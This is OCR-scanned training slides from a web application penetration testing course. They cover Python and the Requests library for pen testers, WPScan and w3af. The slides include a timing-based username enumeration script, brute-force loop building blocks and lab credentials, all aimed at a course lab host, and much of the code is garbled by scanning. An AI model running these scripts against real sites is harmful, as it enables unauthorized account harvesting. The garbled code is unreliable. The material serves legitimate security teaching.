• Python 3 is the current version of Python: 
o Guido van Rossum (the original creator of the Python language) decided to clean up Python 2.x 
properly, with less regardfor backwards compatibility than is the case for new releases in the 2.x 
range. The most drastic improvement is the better Unicode support (with all text strings being 
Unicode by default) as well as saner bytes/Unicode separation. 
o Besides, several aspects of the core language (such as print and exec being statements, integers 
using floor division) have been adjusted to be easier for newcomers to learn and to be more 
consistent with the rest of the language, and old cruft has been removed (for example, all classes 
are now new-style, "range()" returns a memory efficient iterable, not a list as in 2.x).2 
Python 3 includes a number of features that are not available in Python 2: 
A non-exhaustive list of features which are only available in 3.x releases and won't be backported to the 2.x 
series: 
• 
strings are Unicode by default 
• 
clean Unicode/bytes separation 
• 
exception chaining 
• function annotations 
• 
syntax for keyword-only arguments 
• 
extended tuple unpacking 
• 
non-local variable declarations' 
References: 
[ 1] https://wiki.python.org/moin/Python2orPython3 (https://cyber.gd/542 _535) QR 
[2] Ibid. 
[3] Ibid. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
25 
'---' 
'---' 
So, lt's}Sirnple, Just Use Python 3, Right? 
• The general answer ( especially if you plan to write a new open source tool in 
Python) is yes 
• A few issues to keep in mind for penetration testers 
o We often need to create one-off 'quick and dirty' scripts that we use once, or for our own personal 
use across a number of engagements 
o Python 2 is still the default version of 'python' on macOS and in most Linux distros 
• Including (as of the courseware publication date) Ubuntu 16.04 and Kali 
• Python 3 is usually also included, called 'pythons' 
• These distributions are still optimized for Python 2, including the installed/configured libraries 
• Python 3 is the future, so penetration testers should use it, learn the syntax 
differences, etc. 
o The upcoming Python lab will use Python 3 
o For simple penetration testing scripts, Python 2 works fine 
'---' 
'-J 
'-' 
'-' 
'---' 
'---' 
'-J 
'-' 
____, 
'---' 
'-' 
'---' 
'-../ 
'---' 
Here's a real-world example of writing Python 3 script on Ubuntu Linux 14.04. Here's the web server product 
string script we showed a few slides ago, changed to use Python 3 this time. We put parentheses around the 
printed value since the Python 2 print command is now the print (} function in Python 3 (requiring 
parentheses around the function options): 
#!/usr/bin/python3 
import requests 
r = requests.get('http://www.sec542.org'} 
print (r.headers['server']} 
We have a problem, however: Ubuntu 14.04 has installed/configured Requests for Python 2, but not version 3: 
$ ./product.py 
Traceback (most recent call last): 
File "./product.py", line 2, in <module> 
import requests 
ImportError: No module named requests 
Some Googling resulted in this command, which solved the problem: 
$ sudo apt-get install python3-requests 
Not a big deal, but there are hundreds of Python libraries, and 'time is money' (literally for third-party 
penetration testers). These types of issues are very common when using Python 3 on a system that defaults to 
Python 2. Note that we already made this fix for the course Ubuntu Linux VM, so there is no need to install 
python3-req uests. 
26 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-../ 
'-../ 
'---' 
'-../ 
'---' 
'-../ 
'-' 
'---' 
'-../ 
'---' 
'-../ 
'-' 
'--' 
'---' 
'-../ 
'--' 
'---' 
'-../ 
'---' 
'---' 
'-' 
'-../ 
'---' 
'--' 
We Have Awesome Tools: Why Write Scripts? 
We have many fantastic tools at our disposal 
• Many, such as the Burp Suite, are quite configurable 
Some common questions from previous Securitygaz students: 
• "What tool will take a dictionary, and launch a John-the-Ripper style hybrid password 
guessing attack against a website using Basic authentication?" 
• "What tool can automate the high score submission in the Snake game we played on day 
1, repeatedly submitting slightly higher scores over and over again, maximizing the top 
score?" 
• "What tool can launch a true web directory brute force attack, guessing all directory 
names of a certain length?" 
o "How can I automate this, or have junior staff members repeatedly perform this step?" 
One answer: Python! 
Note: Today's Python lab takes on the 'true directory brute force' challenge, and today's final workbook section 
includes bonus challenges (and code) for the John-the-Ripper-style hybrid attack, as well as the Snake 
challenge. Spoiler alert: All of this code (and more) is also in the /home/student/Desktop/python directory. 
When asked how to perform a variety of advanced web application penetration goals, the course authors usually 
answer, "Write a Python script." This answer is often met with a blank stare, followed by restating and re-asking 
the same question. This speaks to a larger problem: Information security professionals who cannot write scripts 
or program, and instead rely on existing tools. This may not be a fatal flaw for some types of lnfoSec 
professionals, but it is truly limiting for a penetration tester. 
A penetration tester who cannot program and/or write scripts will never be great at his/her job. A lack of 
programming will handcuff that person, limiting their potential. For those who haven't programmed before: 
Learning a scripting language includes a learning curve, which is a price well worth paying. 
An interception proxy like Burp or ZAP can perform the tasks described above, but these tools also require a 
learning curve, and plenty of'keyboard time' to master. Junior staff may lack the skills and experience to 
perform the tasks above using Burp or ZAP, but they can certainly run a script someone else wrote. 
Scripts also lend themselves to automation and lead to better economies of scale, which are critical as both the 
size and number of penetration testing engagements grow. Tools like Burp have some automation features and 
plugins (such as the Carbonator extension1), but scripts are truly unlimited in this regard. 
Reference: 
[ 1] https://portswigger.net/bappstore/ShowBappDetails.aspx?uuid=e3a26fff8e I d40 I dade52f3a8d42d06b 
(https://cyber.gd/542 _544) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
27 
'-' 
'-' 
Python•• Basics · 
The next few slides include a (very) brief primer on Python, designed to get you up-and- 
running by writing short (but powerful) Python scripts, focusing on web application 
penetration testing 
• If you'd like a deeper dive into Python, check out SEC573: Automating Information Security for 
Python, written by @MarkBaggett (GSE #15) 
There are also a wealth of free resources available online: 
• Codecademy's Python class: https://www.codecademy.com/learn/python 
(https://cyber.gd/542_536) 
• Google's Python class: https://developers.google.com/edu/python/ 
(https://cyber.gd/542_537) 
• The Python Tutorial: https://docs.python.org/3/tutorial/ 
(https://cyber.gd/542_538) 
• Learn Python: http://www.learnpython.org/ (https://cyber.gd/542_539) 
More links below 
'-" 
'-" 
'-' 
'-" 
'-" 
'-" 
'---' 
'-' 
'-../ 
'-" 
'---' 
'-" 
We are blessed with a wealth of high-quality, free Python resources online. We can personally recommend 
Codecademy's Python class:1 
!nstructis::!ns: 
Create 0 whi1~ bop Hls'.tt 
Here are a few aggregator links, linking to dozens or more sites designed to teach Python programming 
• 
The 5 Best Websites To Learn Python Programming: http://www.makeuseof.com/tag/5-websites-learn- 
python-programming/ (https:/ /cyber.gd/542 _ 540) 
• 
The 50 Best Websites to Learn Python: http://www.codeconquest.com/blog/the-50-best-websites-to- 
learn-python/ (https://cyber.gd/542 _541) 
• 
20 Best Free Tutorials to Learn Python: Find the Killer Python Tutorial PDF, eBook or Online: 
http://noeticforce.com/best-free-tutorials-to-leam-python-pdfs-ebooks-online-interactive 
(https://cyber.gd/542 _542) 
Reference: 
[I] https://www.codecademy.com/leam/python (https://cyber.gd/542 _536) 
28 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
. .____, 
'-' 
'-" 
'-' 
'---' 
'-' 
'-" 
'---' 
'-" 
'-" 
'-" 
'-" 
'---'' 
'-' 
'-" 
'-" 
'-' 
'-.J 
'-" 
'-" 
'-' 
'-" 
'-' 
'-' 
Python DataTypes and if/el.if/else Syntax 
• Python supports a number of data types, 
we'll focus on the most useful for 
penetration testers: 
o String: i tern=" towel" 
o Boolean: h=True 
o Integer: answer=42 
o Float: ratio=l. 6180339887 5 
• The script on the right illustrates the 
Python if/elif/else syntax 
o elif is short for "else if' 
• The script also shows how to gather 
interactive keyboard input from a user via 
the input () function 
#!/usr/bin/python3 
code= int(input("Please enter an HTTP 
status code: 
")) 
if (code>= 100) and (code<= 199): 
print ("lXX: Informational") 
elif (code>= 200) and (code<= 299): 
print ("2XX: Success") 
elif (code>= 300) and (code<= 399): 
print ("3XX: Redirection") 
elif (code>= 400) and (code<= 499): 
print ("4XX: Client Error") 
elif (code>= 500) and (code<= 599): 
print ( "5XX: Server Error") 
else: 
print ( "Unknown HTTP status code") 
Note the code above on the right: 
code= int(input("Please enter an HTTP status code: 
11)) 
The Python input () function returns a string by default. We'd like an integer, so we convert the code 
variable to an integer via the int () function. 
If the user enters a non-integer (such as a string or a floating-point decimal), the program will exit with the 
followingerror:ValueError: invalid literal for int() with base 10: 
The code above on the right also shows the Boolean and operator, as well as the comparison operator==. As 
with most modem languages, Python supports the logical Boolean operators and, or and not. Python also 
supports the following comparison operators: 
Operation 
Meaning 
< 
Less than 
<= 
Less than or equal 
> 
Greater than 
>= 
Greater than or equal 
-- 
Equal1 
Reference: 
[ l] https://docs.python.org/2/library/stdtypes.html (https://cyber.gd/542 _543) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
29 
'--1 
'--1 
Python Loops 
We often need to loop through a series of values 
• The following example is a building block for the upcoming Python lab (where we will build a directory 
brute forcer) 
• It imports ascii_lowercase (returning the string 'abcdefghijklmnopqrstuvwxyz') 
• The outer for statement loops from a to z 
• Then the inner for statement also loops from a to z 
This for loop will print 'aa' through 'zz', and all combinations in between (an example of a 
while loop is shown in the notes): 
#!/usr/bin/python3 
from string import ascii_lowercase 
for a in ascii lowercase: 
for bin ascii lowercase: 
print {a+b) 
I.._., 
'-' 
'--1 
'-' 
'-' 
'-' 
'----' 
'-.J 
'----' 
'----' 
'--../ 
'-' 
'-' 
We imported ascii_lowercase in the example above, but we can also use custom strings to achieve the same 
effect (and add characters, such as 0-9). This code snippet does that: 
characters="abcdefghijklmnopqrstuvwxyz1234567890" 
for a in characters: 
for bin characters: 
print (a+b) 
In addition to for loops (one is shown above), while loops are also supported in Python. A for loop is often 
used to iterate through all values. On the other hand, a while loop is usually used to loop until a condition is 
met. 
Here is an example of both a while loop (it also uses the input () function to collect data from a user): 
#!/usr/bin/python3 
answer= 1111 
while answer!= 114211: 
answer= input("Enter the answer to the ultimate question of life, 
the universe, and everything: ") 
print ( "Wrong answer, try again! ") 
print("That is the correct answer! Now what was the question 
... ") 
The final print statement will not trigger until the while exits. 
30 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
'----' 
'--../ 
'----"' 
'-' 
'-.J 
'-' 
'-' 
'-...,, 
'----' 
'-' 
'-.J 
\......' 
'-...,, 
'--' 
'----"' 
'-' 
'----' 
'-' 
'--1 
'--1 
.'--' 
'----"' 
'-.../ 
Python Lists and Dictionaries 
• Lists are one of the fundamental data structures in Python 
o As the name implies, they contain an ordered list of data: 
usernames = 
['adent', 
'fprefect', 
'zbeeblebrox', 
'tmcmillan'] 
o Lists are often processed in order: 
for name in usernames: 
print (name) 
• Dictionaries are similar to lists, but they support setting key:value pairings 
o They are often called 'associative arrays' or 'hashes' in other languages 
o Python dictionaries are unordered, and the key must be unique 
o Here is an example: 
planets= {'adent':'Earth', 'tmcmillan':'Earth', 'fprefect':'Betelgeuse 
Five'} 
SEC542 ]Web App Penetration Testing and Ethical I-lacking 
Here is a simple script showing some basic Python list usage: 
usernames = 
['adent', 
'fprefect', 
'zbeeblebrox', 
'tmcmillan'] 
print (usernames[O]) 
print (len(usernames)) 
Here is the output: 
$ 
• /list .py 
adent 
4 
This script shows basic Python dictionary usage: 
planets= {'adent' :'Earth', 'tmcmillan': 'Earth', 'fprefect': 'Betelgeuse 
Five'} 
print (len(planets)) 
print (planets['fprefect']) 
Here is the output: 
$ 
./dictionary.py 
3 
Betelgeuse Five 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
31 
'-...,I 
'-...,I 
Python Web. L.ibraries 
A number of general-purpose web 
libraries have been released for 
Python over the years: 
• urillib 
• urllibz 
o Python 3 splits this functionality into 
urllib.request and urllib.error 
• urllibg 
• httplib 
o Renamed http.client in Python 3 
• httplibz 
• Requests 
These libraries offer a vast array of 
overlapping, yet different, features 
• For example: Many scripts import both 
urllib and urllibz in order to gain access to 
the combined functionality 
The Requests library has supplanted 
many of these libraries and has 
become the go-to choice for many 
Python developers 
• Requests is built on top of urllibg 
• The Requests package is recommended 
for a higher-level HTTP client interface.' 
'-" 
'-" 
'-../ 
\.J 
'-" 
'--' 
'-../ 
'--' 
'--' 
'--' 
'--' 
'----' 
The Requests philosophy quotes some elements of "PEP 20." PEP stands for 'Python Enhancement Proposals," 
and "PEP 20" is The Zen of Python (shown below). 
Requests was developed with a few PEP 20 idioms in mind. 
I. 
Beautiful is better than ugly. 
2. 
Explicit is better than implicit. 
3. 
Simple is better than complex. 
4. 
Complex is better than complicated. 
5. 
Readability counts. 2 
The Zen of 
t 
½0\'01' 
32 
3 
References: 
[I] https://docs.python.org/2/library/httplib.html (https://cyber.gd/542 _545) 
[2] http:// docs. python-req uests.org/en/master/user/intro/ (https://cyber.gd/54 2 _ 546) 
[3] https://www.python.org/dev/peps/pep-0020/ (https://cyber.gd/542 _547) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.J 
'--' 
'----' 
'----' 
'-J 
'-J 
'--' 
'--' 
'-" 
'-' 
\.J 
'--' 
'---' 
'-../ 
'-J 
'--' 
'-' 
'-...,I
'-...,I
'----' 
'--'
'----' 
\.J 
'-' 
'-../ 
'-' 
Requests 
• Requests abstracts many lower-level details, resulting in powerful code that is fast to write 
• For example, here is a script that uses Requests to download a URL and print the response: 
#!/usr/bin/python3 
import requests 
r = requests.get('http://www.sec542.org') 
print (r.text) 
• This script does the same, but also authenticates via basic authentication: 
#!/usr/bin/python3 
import requests 
r = requests.get(1http://www.sec542.org/basic1,auth=('marvin1, 'paranoid')) 
print (r.text) 
33 
SEC542 JWeb App Penetration Testing and Ethical Hacking 
To illustrate (some) of the power of Requests, here is a script that also authenticates using basic authentication, 
using Python 2 and urllib2. It uses the same URL, user, and password as the example above, and produces the 
same output. 
#!/usr/bin/python 
import urllib2, base64 
r = urllib2.Request("http://www.sec542.org/basic/") 
b64 = base64.encodestring('%s:%s' 
% ( 'marvin' , 'paranoid' ) ) . replace ( '\n' , 
' ' ) 
r.add header("Authorization", "Basic %s" % b64) 
result= urllib2.urlopen(r) 
print result.read() 
While urllib2 can perform basic authentication, it does not handle the underlying details: These include 
converting the usemame and password to a Base64-encoded field, adding the proper Authorization header, etc. 
This puts the onus on the programmer to handle these details, which takes more time and adds unnecessary 
complication. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
33 
'---' 
'---' 
More Requests 
Requests supports multiple 
authentication methods: 
• Basic 
• Digest 
• Kerberos 
•NTLM 
•AWS 
• Oauthi 
Additional useful features for 
penetration testers: 
• First, make a get: 
r = 
requests.get('http://www.sec542.o 
rg') 
• Then print the response status code: 
print (r.status_code) 
• Print a dictionary of all headers: 
print (r.headers) 
• Print the round trip time of a 
request: 
print (r.elapsed.total seconds()) 
SEC542 I Web App Penetration Testing and Ethical Hacking 
34 
\J 
...__,, 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
Here is the output from the commands on the slide above (spaces added for clarity): 
200 
CaseinsensitiveDict({'content-encoding': 
'gzip', 
'content-type': 
'text/html', 
'accept-ranges': 
'bytes', 
'last-modified': 
'Sat, 26 Dec 
2015 22: 18: 28 GMT', 
'etag' : 
'" 870-527d4738955c2-gzip"', 
'date': 
'Sun, 
08 Jan 2017 21:36:33 GMT', 
'content-length': 
'850', 
'server': 
'Apache/2.4.7 (Ubuntu) ', 
'vary': 
'Accept-Encoding'}) 
0. 002511 
As noted above, Requests supports many authentication methods. 
Here's an example of Requests using HTTP Digest authentication: 
#!/usr/bin/python3 
import requests 
from requests.auth import HTTPDigestAuth 
r=requests.get('http://www.sec542.org', 
auth=HTTPDigestAuth('trillian', 
'towel')) 
print (r.text) 
34 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--' 
'---' 
'-' 
'---' 
'---' 
'-./ 
'---' 
'---' 
...__,, 
'---' 
'--' 
'---' 
...__,, 
'---' 
'---' 
'---' 
'---' 
'-' 
'---' 
'-' 
...__,, 
'---' 
'---' 
'---' 
...__,, 
POST via Requests 
Requests also supports POSTs 
• POST options are sent via a dictionary called 'data' in {'variable' : 'value'} format 
• Multiple variables may be passed: 
data={'variablel': 'valuel', 'variable2':'value2'} 
This script authenticates to the form we used in the 542.2 authentication lab (usernamevford, 
pass=galaxy, button=Login): 
#!/usr/bin/python3 
import requests 
r = requests.post('http://sec542.org/form_auth/login.php', data 
{1user1:1ford1, 1pass1:1galaxy1,1button1:1Login1}) 
print (r.text) 
Requests can also POST data from a file 
• Useful for more complicated POSTs, see notes for details 
The example above is simple, so passing the POST variables via a dictionary works fine. Other POSTs are far 
more complicated, however. In these cases, saving the POST body to a file, and sending that file via Requests is 
far easier than creating a dictionary for every variable and value. 
One way to do this: Proxy the POST via ZAP, and then save the body of the post to a file. In ZAP, right-click on 
the body of the POST, and choose Save Raw-> Request-> Body (save as formbody.raw). 
This script will then make the POST: 
#!/usr/bin/python3 
import requests 
postfile=open('formbody.raw', 'r') 
postdata = postfile.read() 
headers= {'content-type': 
'application/x-www-form-urlencoded'} 
r=requests.post('http://www.sec542.org/form_auth/login.php',data=postdata,h 
eaders=headers) 
print (r.text) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
35 
\_.I 
• Requests handles SSL/TLS transparently: 
r = requests.get(1https://www.sec542.org1) 
print (r. text) 
• Requests verifies the x.509 certificate by default, and will exit with a 
(large) error message if the cert is invalid 
oBy default: verify=True 
• Set verify=False to connect to a site with an invalid (self-signed, 
expired, etc.) certificate, such as the self-signed cert by heart.bleed: 
r = requests.get(1https://heart.bleed1,verify=False) 
print (r. text) 
'--' 
\_.I 
'-J 
'--.__.; 
'----' 
'-J 
'-.J 
'-.J 
'----' 
\_.I 
'-J 
'-J 
'-J 
'-.J 
Requests automatically verifies the x.509 certificate and exits with an error if it is not valid. The following 
commands are equivalent: 
r = requests.get('https://www.sec542.org') 
r = requests.get('https://www.sec542.org',verify=True) 
To connect to an SSL/TLS site that uses an invalid certificate (such as the self-signed certificate used by 
heart.bleed), you must set 'verify=False', otherwise, the script will exit with a long error, ending in this 
line: 
requests.exceptions.SSLError: 
[SSL: CERTIFICATE_VERIFY_FAILED] 
certificate verify failed ( ssl.c:600) 
36 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----' 
'----' 
'-J 
'--' 
'-J 
\-.J 
'-J 
'----' 
'-.J 
'----' 
\_.I 
'--' 
'-J 
'-J 
\-.J 
'----' 
\_.I 
\_.I 
'-' 
'--' 
\_.I 
\_.I 
'-' 
'-' 
'----' 
Putting (a Lot of) ltTogether 
Here is a Python version of the timing (advanced username harvesting) attack from 542.2: 
#!/usr/bin/python3 
import requests 
from string import ascii lowercase 
with open('combined') as f: 
lines= f.read() .splitlines() 
for lname in lines: 
for init in ascii lowercase: 
username=init+lname 
data 
r = requests.post('http://www.sec542.org/userenum/secure1ogin.php', 
{'user':username, 'pass':'badpass', 1button':'Login1}) 
roundtrip = r.elapsed.total seconds() 
print (str(roundtrip)+": "+username) 
Note the use of a loop and f. read() . spli tlines () to read the file (spli tlines () removes the 
newline at end of each line): 
with open('combined') as f: 
lines= f.read() .splitlines() 
Also, note that Python requires consistent indentation of each block of code (such as the 'for' and 'with' 
statements above). We used 2 spaces for each block in the example above. Many programmers use four spaces; 
the important part is remaining consistent. Tabs can also be used, but spaces are more portable across various 
operating systems (the tabs vs. spaces debate can lead to heated arguments among programmers). 
Here are the results of the script, sorted by number (sort -n), and looking at the 10 last (longest) round trip 
time entries (tail -10): 
$ 
./timing.py I 
sort -n I 
tail -10 
0.001978: aadams 
0.002643: alee 
0.215132: adent 
0.215465: djohnson 
0.215802: hjones 
0.216107: zbeeblebrox 
0.216895: swilliams 
0.216903: fprefect 
0.218225: lsmith 
0.227028: klewis 
There is a big jump in round trip times from alee (account does not exist) to adent and the rest (accounts exist). 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
37 
'--' 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request Forgery 
2. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
5. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
8. Exercise: WPScan 
9. w3af 
I 0. Exercise: w3af 
I l . Metasploit 
12. ixercise: Metasploit 
13. When Tools Fail 
14. Exercise; When Tools Fail 
15. Pen Testing Methods 
App Pen Test Preparation 
and Presenting 
18 •. Summary 
SEC542 !Web App Penetration Testing and Ethical Hacking 
38 
'--' 
-.___, 
'--' 
'---' 
'---' 
'---' 
'--' 
'---' 
'-' 
'-' 
'--' 
'-' 
'-' 
'--' 
'--' 
'--' 
Course Roadmap 
'--' 
\..../ 
Our next section is a Python exercise. 
'-' 
'--' 
'-' 
'--' 
'--' 
\..../ 
'--' 
'-./ 
'-' 
'.J 
'--' 
'-' 
'--' 
'-..J 
'.J 
'-' 
'--' 
'--' 
38 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
SEC:542 Workbook: Python 
"; -=- ; 
Exercise 5.3: Python 
SEC542 I Web App Penetration Testing and Ethical Hacking 
39 
SEC542 Workbook: Python 
Please go to Exercise 5.3 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
39 
'-..-I 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSIIF,LOGIC FLAWS,ANDADVANCEDTOOLS 
L i;.;ross·~tte 
:t Exercise: CSftF 
3. Logic Attacks 
4. Exercise: Mobile MITH 
5. Python for Web App Pen Testers 
6. E,c:ercise: Python 
7.WPScan 
,!t exercise: WPSc,m 
9. w3af 
18. Exerciser w 3af 
11. 
12. 
13. When 'rools Fail 
14. Exercise: When Tools fail 
IS. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
18. Summary 
'-" 
'-.../ 
'----' 
'-' 
'-' 
'----' 
'-' 
'-' 
'----' 
'-' 
'-' 
'-" 
'-' 
Course Roadmap 
Next up is an introduction to WPScan. 
40 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
.'----' 
'-" 
'-" 
'-" 
'-" 
'----' 
'-'' 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-" 
'-' 
'----' 
'-' 
'-../ 
'-" 
'-' 
'-.../ 
'----' 
'-' 
'-.J 
'----'. 
WPScan 
Most of the tools and techniques explored in SEC542 have been 
somewhat manual and general purpose 
• This will be a departure from that general trend 
WPScan is an automated scanning tool with a particularly narrow 
focus: 
• Enumerating WordPress flaws 
Given the ubiquity of W ordPress - both public-facing and internal 
• And the high incidence of unpatched sites 
• This narrowly focused tool is still widely applicable 
The primary focus of the class thus far has been largely that of manual testing techniques, though frequently 
made more efficient through the use of tools. Further, most of the techniques discussed have had a rather 
general-purpose appeal, as opposed to being heavily focused on product-specific issues. Now, we will depart 
from both of those general trends by wielding an automated "black-box" scanning tool. Moreover, the tool has a 
laser-beam focus on one particular product, namely WordPress. 
WPScan is the tool in question. WPScan provides an automated WordPress vulnerability scanner. In spite of the 
narrow focus on WordPress, the ubiquity of WordPress makes this a widely applicable tool in assessments of 
public-facing as well as internal applications. 
WPScan is available from http://wpscan.org/ (https://cyber.gd/542 ~527) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
41 
'--' 
'--' 
WPScan• Detail.s 
Actively updated vulnerability scanner for W ordPress 
\\ 
\ \ I\ I I 
\ \I \/ I 
\ I\ I 
\J \I 
WordPress Security Scanner by the WPScan Team 
V.;rsion 2.9.2 
Sponsored by sucurt - nt tps :/ / sucur-Lnet 
@)'iPScan __ , @ethicalhack3r, @erwan_,tr, pvdl, @ FireFart. 
Be sure to update the WPScan vulnerability database when using: 
$ wpscan.rb --update 
https://github.com/wpscanteam/wpscan 
~=" 
=0:'!0:!'~ ? 
I,,_., 
'--' 
'-' 
'---' 
'---' 
'--' 
'---' 
'-' 
'-' 
'-' 
'-' 
'--' 
'--' 
'-' 
'-' 
'-J 
'-' 
As WordPress vulnerabilities and patches are released, so too is WPScan updated. The tool receives active 
updates to allow for discovery of current and future updates. One of the most important tasks with WP Scan is 
ensuring that the tool's internal database has been updated. Thankfully this can be easily accomplished with the 
following command line: 
$ wpscan.rb --update 
Note: With the installation on the provided VM, this command will need to be run as follows: 
$ sudo /opt/wpscan/wpscan.rb --update 
WPScan is open source and available on GitHub.1 
Reference: 
[l] https://github.com/wpscanteam/wpscan (https://cyber.gd/542_528) QR 
42 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--' 
'-' 
'--' 
'-J 
'--' 
'---' 
\._.; 
'---' 
'---' 
'---' 
'-' 
'-._./ 
'--' 
'-' 
'---' 
'-' 
'-" 
'-" 
'--' 
'-._./ 
'--' 
'-' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Re(iuest Forgery 
2. Exen::ise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
5. Python for Web App 
Testers 
6. Exercise: Python 
7. WPScan 
8. Exercise: WPScan 
9. w3af 
!O. Exercise: w3af 
! I • Metasploit 
12. Exercise: Metasploit 
13. When Tools Fail 
14. Exercise: When Tools fail 
1.5. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and p.,,, .. ,.,,.tiru" 
18. Summary 
SEC542 fWeb App Penetration Testing and Ethical Had<ing 
43 
Course Roadmap 
Next up is an exercise with the automated WordPress scanner, WPScan. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
43 
SEC542 Workbook: WPScan 
Ill 
Exercise 5.4: WPScan 
SEC542 I Web App Penetration Testing and Ethical Hacking 
44 
..__,, 
'--./ 
'-J 
'--' 
'-J 
'--' 
'-' 
,_.., 
'-' 
'---' 
'--' 
'-.../ 
'-' 
'-..J 
SEC542 Workbook: WPScan 
'-..J 
'--' 
'---' 
'---' 
Please go to Exercise 5.4 in the 542 Workbook. 
''-, 
. ..__,, 
'-.../ 
'--" 
'--' 
'---' 
'-" 
'--" 
'--" 
'--' 
'--' 
'--' 
'--' 
'--" 
'---' 
'--' 
'--" 
44 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
'-.../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,ANDADVANCEDTOOLS 
I. Cross-Site Request Forgery 
Exercise: CSRF 
l. Logic 
4. 
eHITM 
5. Python for Web A~p Pen Testers 
6. Exercise: Python 
1. WPScan 
8. Exercise: WPScan 
9. wlaf 
f 0. Exerci11e: 
11 • Hetasploit 
I 2. Exercise: Metasploit 
u. When Tools Fail 
14. Exercise: When Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
18.Summa.ry 
Course Roadmap 
We will discuss w3af(the Web Application Attack and Audit Framework) next. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
45 
'---' 
\..../ 
VVeb Applica.tion Attack. and Audit .Framework 
• wgaf is an open source web application scanner 
• The project lead is Andres Riancho, but a large number of developers have 
contributed patches and features 
• It is written in Python and has both a GUI and a command-terminal console 
interface: 
o The GUI is simpler to use, whereas the console is designed to provide more control of the 
scan 
• wgaf is designed to perform the spidering part of mapping, all the server-side 
vulnerability discovery and exploitation: 
o It bundles multiple tools such as sqlmap and BeEF to accomplish all this 
~W3Gf 
o These are built in to wgaf as exploit modules 
'-' 
'-.._./ 
'-./ 
'---' 
'-.._./ 
'-.._./ 
'-" 
'-.._./ 
'-.._./ 
'-J 
'-' 
'---' 
'-.._./ 
'---' 
w3af is an open source application that is written in Python. Andres Riancho is the current project lead. It is a 
framework that enables developers and testers to write plugins that work together to perform the tests needed. 
Currently, it has a console interface, similar to Metasploit, and a GUI using GTK. This application runs on 
almost every platform. The GUI is simpler to use, but the console provides more control of the scan. w3af 
performs all the steps involved in the application test. This includes exploitation using bundled tools such as 
BeEF and SQLMap. 
References: 
Main site: http://w3af.org/ (https://cyber.gd/542 _ 416) 
Source code: https://github.com/andresriancho/w3af (https://cyber.gd/542 _ 417) QR 
46 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-.._./ 
'-.._./. 
'---' 
'-.._./ 
'-.._./ 
'---' 
'-.._./ 
\___./ 
'---' 
'---' 
'-..J 
'---' 
'-" 
'-.._./ 
'-.J 
'-" 
.__,. 
'-.J 
'---' 
'-..../ 
'-..../ 
'-.._./ 
'---' 
'-.J 
'---' 
ThewlafGUI 
• The wgaf GUI is designed to be as simple as possible 
• We can build various profiles that allow us to save specific scan 
configurations 
o We build various scan profiles that include different test types; then, when starting a 
penetration test, we put the target URL into the profile 
o This provides standard test schemes across pen tests 
• The target URL is the starting point of any scan 
• A tester can choose entire categories or expand categories to select individual 
plugins 
o We recommend the latter because it provides the tester with greater control 
o It also allows us to decide if we want to use the experimental plugins in a category 
The GUI is designed to be simple to use while providing all we need to perform an application test. w3afuses 
the concept of a profile to control what goes into a scan. We commonly build multiple profiles that include 
different plugins and tests and save them for later use. 
The target URL is the starting point for the test. Keep in mind that it requires an entire URL including the 
protocol. We then select each plugin we would like to run. If the plugin requires configuration, the options 
display on the right. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
47 
\..._,, 
'---' 
w3af Console 
• On the right is a session running 
within the wgaf console 
